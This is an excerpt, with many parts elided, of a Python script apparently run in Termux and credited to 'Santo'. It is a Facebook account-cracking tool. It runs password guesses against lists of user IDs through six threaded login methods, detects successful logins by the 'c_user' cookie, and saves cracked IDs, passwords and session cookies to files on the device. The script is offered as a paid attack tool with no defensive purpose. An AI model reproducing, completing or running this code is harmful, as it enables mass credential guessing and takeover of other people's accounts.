#created by Santo aka Aryan chaudhary
#open source by Santo
#github= Santo-XD
#BY BY MEY KABHI WAPIS NAHI AAUNGA AB 
#JAI NEPAL
# fb id https://www.facebook.com/mdjaimlo.hok?mibextid=ZbWKwL
...
def uaku2():
	try:
		...
		a=requests.get('https://github.com/Santo-XD/XD/blob/main/ua2.txt').text
		ua=open('.ua2.txt','w')
...
[+]==============================================
[+] CREATED BY   :  Santo Gaming
[+] FB GROUP     :  Termux Teacher Santo
[+] ON GITHUB    :  Termux-Santo
[+] TOOL STATUS  :  Paid
[+] TOOL VIRSION :  0.2
[+]=============================================="""
...
def Santo():
    ...
    elif aryan =='7':os.system("xdg-open https://www.facebook.com/mdjaimlo.hok?mibextid=ZbWKwL")
    else:
...
def Santo1():
	...
	print("[+]==============================================")
	Santolovesyou = input("[+] [CHOOSE] :- ")
	if Santolovesyou in ['y','Y','1','yes','YES','Yes']:
		Santo_xd.append('y')
	else:
		Santo_xd.append('n')
	print("[+]==============================================")
	...
	print("[+]==============================================")
	Santotop = input("[+] [CHOOSE] :- ")
	if Santotop in ['y','Y','Yes','YES','1']:
		baby.append('y')
	else:
		baby.append('n')
	with ThreadPool(max_workers=30) as yaari:
		...
		print(f'[+] METHOD CHOOSED : M{Santofire}')
		...
		for guru in user:
			...
			if Santofire =='1':yaari.submit(mbasic,uid,pwx,tl)
			elif Santofire =='2':yaari.submit(p,uid,pwx,tl)
			elif Santofire =='3':yaari.submit(x,uid,pwx,tl)
			elif Santofire =='4':yaari.submit(mobile,uid,pwx,tl)
			elif Santofire =='5':yaari.submit(freeq,uid,pwx,tl)
			elif Santofire =='6':yaari.submit(d,uid,pwx,tl)
			else:
	...
	print('[?] Ids saved in Santo-OK.txt,Santo-CP.txt')
...
def Santo5():
	...
	with ThreadPool(max_workers=50) as manshera:
		...
		for love in user:
			...
			for Eman in HamiiID:
				pwx.append(Eman)
			if Santofire =='1':manshera.submit(mbasic,uid,pwx,tl)
			elif Santofire =='2':manshera.submit(p,uid,pwx,tl)
			elif Santofire =='3':manshera.submit(x,uid,pwx,tl)
			elif Santofire =='4':manshera.submit(mobile,uid,pwx,tl)
			elif Santofire =='5':manshera.submit(freeq,uid,pwx,tl)
			elif Santofire =='6':manshera.submit(d,uid,pwx,tl)
			else:
...
def mbasic(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[1;92m[Santo-OK] '+cid+' | '+ps+'\33[0;97m')
				if 'y' in Santo_xd:
					print("\33[1;92m[💚] \33[1;98mCOOKIES : \33[1;92m"+coki)
					cek_apk(session,coki)
				else:
					break
				open('/sdcard/Santo-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
				...
				cid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[Santo-CP] '+cid+' | '+ps+'\33[0;97m')
					open('/sdcard/Santo-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
					open('/sdcard/Santo-CP.txt', 'a').write(cid+' | '+ps+'\n')
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M1-Santo] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def p(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M2-Santo] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def x(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M3-Santo] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def mobile(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M4-Santo] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def freeq(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M5-Santo] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def d(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M6-Santo] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
